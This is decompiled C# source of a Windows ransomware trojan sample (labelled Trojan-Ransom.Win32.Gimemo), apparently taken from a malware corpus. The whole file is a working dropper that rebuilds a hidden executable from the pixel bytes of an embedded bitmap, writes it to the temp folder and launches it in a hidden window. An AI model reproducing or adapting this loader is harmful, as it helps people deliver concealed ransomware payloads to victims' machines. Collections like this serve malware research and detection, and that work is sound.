// Decompiled with JetBrains decompiler
// Type: QuickImage
// Assembly: Java, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0B7E186-6694-4EE2-AF65-1F136DCB2A73
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Gimemo.bekc-94a7fbca100a2fbc0cbd681299bb9da220786dfb1522b8138e50aeae2e9bfce2.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;

[StandardModule]
internal sealed class QuickImage
{
  public static byte[] DCImage(Bitmap BM)
  {
    List<byte> byteList = new List<byte>();
    int num1 = checked (BM.Width - 1);
    int x = 0;
    while (x <= num1)
    {
      int num2 = checked (BM.Height - 1);
      int y = 0;
      while (y <= num2)
      {
        Color pixel = BM.GetPixel(x, y);
        if (pixel != Color.FromArgb(0, 0, 0, 0))
        {
          byteList.Add(pixel.R);
          byteList.Add(pixel.G);
          byteList.Add(pixel.B);
        }
        checked { ++y; }
      }
      checked { ++x; }
    }
    return byteList.ToArray();
  }

  [STAThread]
  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void Main()
  {
    string path = Path.GetTempPath() + "\\37635#.exe";
    byte[] bytes = QuickImage.DCImage((Bitmap) new ResourceManager("myRes", Assembly.GetExecutingAssembly()).GetObject("Image1"));
    File.WriteAllBytes(path, bytes);
    new Process()
    {
      StartInfo = {
        FileName = path,
        WindowStyle = ProcessWindowStyle.Hidden
      }
    }.Start();
    ProjectData.EndApp();
  }
}
